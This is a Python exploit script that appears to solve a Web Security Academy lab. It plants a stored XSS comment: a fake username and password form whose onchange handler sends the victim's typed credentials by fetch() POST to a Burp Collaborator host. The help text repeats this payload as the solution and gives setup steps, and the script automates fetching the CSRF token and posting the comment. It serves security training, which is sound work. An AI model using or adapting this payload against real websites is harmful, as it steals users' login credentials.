#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
from argparse import RawTextHelpFormatter
from bs4 import BeautifulSoup

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Cross-Site Scripting (XSS) Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://azdggml78f7wt74gouge0rtlwc22qr.burpcollaborator.net',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://azdggml78f7wt74gouge0rtlwc22qr.burpcollaborator.net',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">" 

First, we need to open Burp Collaborator following these steps:

Open Burp Suite -> Click Burp (top left button) -> Click Burp Collaborator Client -> Click Copy to clipboard -> Now Burp Collaborator Server is running and waiting for requests

Replace the [0-9a-z]{30}.burpcollaborator.net address with the copied one

Soltuion:
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://azdggml78f7wt74gouge0rtlwc22qr.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: ', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command
s = requests.Session()

def xss(url, command, csrf):
    comm_path = '/post/comment'
    data = {
        'csrf': csrf,
        'postId': 1,
        'comment': command,
        'name': 'author',
        'email': 'test@test.com',
        'website': 'https://test.com'
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        s.post(url + comm_path, data=data, verify=False, proxies=proxies)
    else:
        s.post(url + comm_path, data=data, verify=False)
        print("(+) Now open the Burp Collaborator client window, select the HTTP request, click <Request to Collaborator> and login with the credentials in the POST body")
        subprocess.call(["firefox", url + '/login'])

def get_csrf(s, url):
    global csrf
    login_path = '/login'
    r = s.get(url + login_path, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def main():
    
    print("(+) Exploiting Stored XSS")

    get_csrf(s, url)
        
    xss(url, command, csrf)

if __name__ == "__main__":
    main()
